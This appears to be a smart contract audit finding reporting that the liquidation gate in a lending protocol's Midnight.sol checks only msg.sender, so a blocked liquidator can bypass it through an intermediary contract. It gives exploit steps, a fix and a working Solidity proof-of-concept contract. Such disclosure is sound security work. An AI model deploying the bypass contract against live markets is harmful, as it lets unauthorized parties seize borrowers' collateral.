### Title
Liquidator Gate Bypass via Non-Gated Intermediary Contract — (File: `src/Midnight.sol`)

---

### Summary

The `liquidate` function enforces the `liquidatorGate` restriction only against `msg.sender`, but the economic beneficiary of the liquidation is the caller-supplied `receiver` address. A gated liquidator can fully bypass the gate by routing the call through a non-gated intermediary contract while directing seized collateral to themselves as `receiver`. This directly violates the protocol's own stated invariant.

---

### Finding Description

**Vulnerability class:** Authorization bypass (auth)

**Root cause — gate checks caller, not economic beneficiary:**

In `src/Midnight.sol`, the `liquidate` function performs the gate check as:

```solidity
require(
    market.liquidatorGate == address(0) || ILiquidatorGate(market.liquidatorGate).canLiquidate(msg.sender),
    LiquidatorGatedFromLiquidating()
);
``` [1](#0-0) 

The seized collateral is then unconditionally transferred to the caller-supplied `receiver`:

```solidity
SafeTransferLib.safeTransfer(market.collateralParams[collateralIndex].token, receiver, seizedAssets);
``` [2](#0-1) 

The repaid loan tokens are pulled from `payer`, which is the `callback` address if one is provided, otherwise `msg.sender`:

```solidity
address payer = callback != address(0) ? callback : msg.sender;
``` [3](#0-2) 

There is no authorization check tying `msg.sender` to `receiver` or `callback`. The `liquidate` function has no `onBehalf` parameter and no `isAuthorized` check — it is fully permissionless except for the gate.

**Exploit path:**

1. Gated liquidator (`GatedAddr`) deploys a thin intermediary contract `Bypass` (not registered in the gate).
2. `GatedAddr` pre-funds `Bypass` with the required repaid loan tokens (or uses `Bypass` as the `callback` to source them via `onLiquidate`).
3. `GatedAddr` calls `Bypass.doLiquidate(...)`, which calls:
   ```
   Midnight.liquidate(market, collateralIndex, seizedAssets, repaidUnits,
       borrower, postMaturityMode,
       receiver = GatedAddr,   // seized collateral goes here
       callback = address(0),  // Bypass is payer
       data = ""
   )
   ```
4. Gate checks `msg.sender = Bypass` → `canLiquidate(Bypass)` → not gated → **passes**.
5. Seized collateral is transferred to `receiver = GatedAddr`.
6. Repaid units are pulled from `payer = Bypass` (pre-funded by `GatedAddr`).

Net result: `GatedAddr` performed the liquidation economically — received seized collateral, bore the repayment cost — while the gate never checked their address.

**Violated invariant (from `live_context.json`):**

> "liquidator gate must not be bypassed through alternate liquidation or callback paths" [4](#0-3) 

This is also explicitly listed as a high-value attack flow the protocol expected to defend against:

> `"attempt liquidation through alternate actor/callback/authorized address"` [5](#0-4) 

---

### Impact Explanation

The `liquidatorGate` is completely nullified. Any address that the gate intends to block from liquidating can trivially bypass it with a one-function intermediary contract. Depending on the gate's purpose (regulatory KYC, whitelist-only liquidators, protocol-controlled liquidation), this can mean:

- Unauthorized parties seize collateral from borrowers in restricted markets.
- The gate operator's access control policy is rendered meaningless.
- Bad debt realization (which is also gated through `liquidate`) can be triggered by unauthorized actors, socializing losses to lenders without authorization.

**Impact: Medium–High** — full bypass of an explicit access control mechanism with direct asset movement consequences.

---

### Likelihood Explanation

The bypass requires only deploying a minimal intermediary contract and pre-funding it with loan tokens. No privileged access, no leaked keys, no oracle manipulation. Any gated liquidator can execute this in a single transaction. The attack is deterministic and requires no timing or race conditions.

**Likelihood: High**

---

### Recommendation

The gate check should validate the economic beneficiary (`receiver`), not just `msg.sender`. The simplest fix is to add a gate check on `receiver` in addition to (or instead of) `msg.sender`:

```solidity
require(
    market.liquidatorGate == address(0)
        || ILiquidatorGate(market.liquidatorGate).canLiquidate(msg.sender),
    LiquidatorGatedFromLiquidating()
);
// Add:
require(
    market.liquidatorGate == address(0)
        || ILiquidatorGate(market.liquidatorGate).canLiquidate(receiver),
    LiquidatorGatedFromLiquidating()
);
```

Alternatively, if the gate's intent is to restrict who initiates and benefits from liquidations, the `ILiquidatorGate` interface could be extended to accept both `msg.sender` and `receiver` for a combined check. The `callback` address (as `payer`) should also be considered if the gate is meant to restrict who funds liquidations.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

import {IMidnight, Market} from "src/interfaces/IMidnight.sol";
import {IERC20} from "src/interfaces/IERC20.sol";

contract LiquidatorGateBypass {
    IMidnight public immutable midnight;

    constructor(IMidnight _midnight) {
        midnight = _midnight;
    }

    /// @notice Called by the gated liquidator. msg.sender here is the gated liquidator,
    ///         but Midnight sees msg.sender = address(this) (not gated).
    function doLiquidate(
        Market calldata market,
        uint256 collateralIndex,
        uint256 seizedAssets,
        uint256 repaidUnits,
        address borrower,
        bool postMaturityMode,
        address receiver  // set to gated liquidator address
    ) external {
        // Pull repaid units from the gated liquidator into this contract
        IERC20(market.loanToken).transferFrom(msg.sender, address(this), repaidUnits);
        IERC20(market.loanToken).approve(address(midnight), repaidUnits);

        // Midnight gate checks msg.sender = address(this) → not gated → passes
        // Seized collateral goes to receiver = gated liquidator
        midnight.liquidate(
            market, collateralIndex, seizedAssets, repaidUnits,
            borrower, postMaturityMode, receiver, address(0), ""
        );
    }
}
```

**Steps:**
1. Deploy `LiquidatorGateBypass` (not registered in the liquidator gate).
2. Gated liquidator approves `LiquidatorGateBypass` for repaid loan tokens.
3. Gated liquidator calls `doLiquidate(..., receiver = gated_liquidator_address)`.
4. Gate check passes (`msg.sender = LiquidatorGateBypass`).
5. Gated liquidator receives seized collateral at `receiver`.
6. Gate is fully bypassed with zero privileged access required.
